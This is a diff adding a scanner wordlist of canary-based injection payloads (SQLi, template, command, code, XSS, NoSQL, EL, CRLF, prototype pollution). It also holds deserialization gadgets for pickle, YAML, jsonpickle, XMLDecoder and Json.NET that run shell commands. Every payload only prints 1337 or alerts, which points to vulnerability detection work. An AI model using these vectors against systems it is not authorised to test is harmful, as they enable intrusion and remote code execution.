@@ -1,0 +1,181 @@
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+')UNION SELECT 7*191,NULL,NULL,NULL--/*')UNION SELECT 7*191,NULL--*/")UNION SELECT 7*191--
+*/UNION SELECT 7*191--/*'UNION ALL SELECT 7*191--*/"UNION SELECT 7*191--
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)[[${7*191}]]
+{{7*'191'}}${7*191}#{7*191}<%= 7*191 %>${{7*191}}{% set x=7*191 %}{{x}}[#assign x=7*191]${x}
+{{7*191}}${7*191}{{=7*191}}<%=7*191%>#{7*191}${{7*191}}${T(java.lang.Math).abs(1337)}
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+&set /a 7*191&;echo $((7*191));'|python3 -c "print(7*191)"|`echo $((7*191))`
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+eval('7*191')
+(7*191)
+int(1337.0)
+abs(-1337)
+##SQLi - Math-Based (Canary: 1337)##
+'UNION SELECT 7*191--
+'UNION SELECT 7*191#
+"UNION SELECT 7*191--
+)UNION SELECT 7*191--
+'))UNION SELECT 7*191--
+'UNION SELECT 7*191,NULL--
+'UNION SELECT NULL,7*191--
+"UNION SELECT 7*191,NULL--
+'UNION SELECT 7*191,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL--
+'UNION SELECT NULL,NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL,NULL--
+'AND 1=(SELECT 7*191)--
+"AND 1=(SELECT 7*191)--
+')AND 1=(SELECT 7*191)--
+'OR 7*191=1337--
+"OR 7*191=1337--
+')OR 7*191=1337--
+'AND 7*191=1337 AND '1'='1
+"AND 7*191=1337 AND "1"="1
+')AND 7*191=1337 AND ('1'='1
+'))AND 7*191=1337 AND (('1'='1
+*/AND 7*191=1337--
+'UNION ALL SELECT 7331/1--
+'UNION ALL SELECT 7331/1,NULL--
+'UNION ALL SELECT NULL,7331/1--
+##SSTI - Math-Based (Canary: 1337)##
+{{7*191}}
+${7*191}
+<%= 7*191 %>
+${{7*191}}
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}
+<#assign x=7*191>${x}
+${T(java.lang.Math).addExact(1330,7)}
+{{7*191}}//
+'}}{{7*191}}//
+"}}{{7*191}}//
+}}{{7*191}}
+{{7*191}}{{7*191}}
+${7*191}${{7*191}}
+<%= 7 * 191 %>
+{{(7)*191}}
+${{(7)*(191)}}
+{{7*191|safe}}
+{%set x=7*191%}{{x}}
+${(7*191)?c}
+{{=7*191}}
+{{7*191}}${{7*191}}<%= 7*191 %>#{7*191}${7*191}
+{{config.__class__.__init__.__globals__['__builtins__']['eval']('7*191')}}
+${(7*191)}
+<%=7*191%>
+{{{7*191}}}
+{{7*191}}{%comment%}{%endcomment%}
+a]}}{{7*191}}
+{{7*191}}/*
+*/{{7*191}}
+<%= (7)*(191) %>
+${(7)*(191)}
+${{7*191}}//
+a]${7*191}
+{{7*191}}${{<%[%'7*191}}%\
+{{range.Repeat 1337}}A{{end}}
+##OS Cmd Injection - Math-Based (Canary: 1337)##
+;expr 7 \* 191
+;echo $((7*191))
+|expr 7 \* 191
+|echo $((7*191))
+||echo $((7*191))
+&&echo $((7*191))
+$(echo $((7*191)))
+`expr 7 \* 191`
+`echo $((7*191))`
+;echo $((7*191))#'`echo $((7*191))`"
+;python3 -c "print(7*191)"
+;python -c "print(7*191)"
+;perl -e "print 7*191"
+;ruby -e "puts 7*191"
+;node -e "console.log(7*191)"
+& set /a 7*191
+& powershell -c "7*191"
+;echo $((7331/1*1))
+|echo $((7331-0))
+;printf '%d' $((7*191))
+;awk 'BEGIN{print 7*191}'
+;bc <<< "7*191"
+${IFS};echo${IFS}$((7*191))
+##Code Injection - Math-Based (Canary: 1337)##
+eval("7*191")
+7*191;
+console.log(7*191)
+echo 7*191;
+puts 7*191
+Math.abs(-1337)
+-1337.abs
+__import__("math").factorial(0)+1336
+parseInt("1337")
+intval("1337")
+Integer("1337")
+(1337).to_s.to_i
+7331-5994
+(function(){return 7*191})()
+##XSS - Math (1337 reflected via context breakers)##
+"'`><script>alert(1337)</script>
+"'`><img src=x onerror=alert(1337)>
+"'`><svg/onload=alert(1337)>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert(1337)//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(alert)(1337)>
+"><img src=x onerror=alert(1337)>
+'><img src=x onerror=alert(1337)>
+"><svg onload=alert(1337)>
+'><svg onload=alert(1337)>
+`><svg onload=alert(1337)>
+</script><svg onload=alert(1337)>
+</title><svg onload=alert(1337)>
+</textarea><svg onload=alert(1337)>
+</style><svg onload=alert(1337)>
+" autofocus onfocus=alert(1337) x="
+' autofocus onfocus=alert(1337) x='
+" onclick=alert(1337) "
+' onclick=alert(1337) '
+javascript:alert(1337)
+javascript:alert(1337)//
+##NoSQL - Math-Based (Canary: 1337)##
+{"$expr":{"$literal":1337}}
+[$where]=return 7*191
+true, $where: 'return 7*191'
+##EL Injection - Math-Based (Canary: 1337)##
+%{7*191}
+${T(java.lang.Math).abs(-1337)}
+#{T(java.lang.Math).abs(-1337)}
+${7*191}${7*191}
+##Prototype Pollution - Math (Canary: 1337)##
+{"__proto__":{"polluted":"1337"}}
+{"constructor":{"prototype":{"polluted":"1337"}}}
+{"__proto__":{"toString":"1337"}}
+{"__proto__":{"valueOf":"1337"}}
+{"__proto__":{"1337":"polluted"}}
+##CRLF - Math (1337 in injected header)##
+%0d%0aInjected-Header:1337
+%0d%0aX-Injected:1337
+\r\nInjected:1337
+%E5%98%8A%E5%98%8DInjected:1337
+%0aInjected:1337
+%0dInjected:1337
+1337%0d%0aInjected:true
+1337%00%0d%0aInjected:true
+##Python Pickle P0 - Math (subprocess echo 1337)##
+Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
+##Python YAML - Math (subprocess echo 1337)##
+!!python/object/apply:subprocess.check_output [["echo","1337"]]
+##Python jsonpickle - Math (subprocess echo 1337)##
+{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
+##XMLDecoder - Math (echo 1337)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##.NET Json.NET - Math (echo 1337)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
